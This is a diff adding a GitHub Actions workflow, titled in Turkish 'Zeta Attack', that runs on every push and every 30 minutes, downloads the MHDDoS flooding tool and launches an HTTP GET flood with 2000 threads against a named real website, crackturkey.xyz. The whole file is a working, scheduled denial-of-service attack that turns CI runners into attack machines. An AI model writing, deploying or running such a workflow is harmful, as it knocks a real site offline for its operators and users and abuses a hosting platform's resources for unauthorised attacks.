@@ -1,0 +1,26 @@
+name: Zeta Saldırısı
+
+on:
+  push:
+  schedule:
+    - cron: '*/30 * * * *'  # Her 30 dakikada bir otomatik saldırı
+
+jobs:
+  attack:
+    runs-on: ubuntu-latest
+    
+    steps:
+      # 1. MHDDoS reposunu klonla
+      - name: MHDDoS'u indir
+        run: |
+          git clone https://github.com/MatrixTM/MHDDoS.git
+          cd MHDDoS
+          sudo apt update
+          sudo apt install python3 python3-pip -y
+          pip3 install -r requirements.txt
+      
+      # 2. Saldırıyı başlat
+      - name: Saldırı başlasın
+        run: |
+          cd MHDDoS
+          python3 start.py GET https://crackturkey.xyz/ 2000 120
